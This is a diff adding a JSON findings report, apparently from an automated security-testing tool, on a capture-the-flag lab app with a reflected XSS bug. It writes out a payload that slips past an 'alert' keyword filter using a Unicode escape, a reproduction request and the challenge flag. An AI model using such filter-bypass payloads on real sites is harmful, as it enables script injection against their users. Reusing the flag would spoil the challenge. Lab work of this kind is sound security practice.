@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:24:03.971494+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "c29c3bb3-8a10-49ba-893d-c246e7dd2ff5",
+      "timestamp": "2026-04-12T21:24:03.971363+00:00",
+      "title": "Reflected XSS via Unicode Escape Filter Bypass - CTF Flag Extracted",
+      "severity": "critical",
+      "target": "http://172.17.0.1:48945/page?name=",
+      "description": "The /page endpoint reflects the 'name' query parameter directly into the HTML without proper sanitization. A server-side filter blocks the literal string 'alert', but this can be bypassed using JavaScript Unicode escapes. The payload window['\\u0061lert']('XSS') passes the filter while executing alert('XSS') at runtime. The flag was returned upon successful XSS execution.",
+      "evidence": "Payload: <script>window['\\u0061lert']('XSS')</script>\nResponse: Congratulations! Here is the flag: flag{cc21e4bb-7e26-4326-ba5a-052b6b1092e1}\n\nFull URL: http://172.17.0.1:48945/page?name=<script>window['\\u0061lert']('XSS')</script>\n\nThe server returned X-XSS-Protection: 0 header indicating intentional XSS vulnerability. The filter blocked 'alert' literally but not its Unicode equivalent \\u0061lert.",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /page?name=%3Cscript%3Ewindow%5B%27%5Cu0061lert%27%5D%28%27XSS%27%29%3C%2Fscript%3E HTTP/1.1\nHost: 172.17.0.1:48945",
+        "expected": "Response body contains: flag{cc21e4bb-7e26-4326-ba5a-052b6b1092e1}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "cbdd8ed2-a0e6-424c-998d-362bbb57fe24",
+      "timestamp": "2026-04-12T21:24:12.585002+00:00",
+      "title": "Dalgona CTF Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> HomePage[\"GET / - Dalgona Challenges Index\"]\n  HomePage --> PageEndpoint[\"GET /page?name= - Dalgona Circle XSS Challenge\"]\n  PageEndpoint --> Filter[\"Server-side filter blocks 'alert' substring\"]\n  Filter --> Bypass[\"Bypass: window['\\\\u0061lert']('XSS')\"] \n  Bypass --> Flag[\"Flag returned: flag{cc21e4bb-7e26-4326-ba5a-052b6b1092e1}\"]\n  PageEndpoint --> Static[\"GET /static/* - CSS, images, assets\"]"
+    }
+  ]
+}
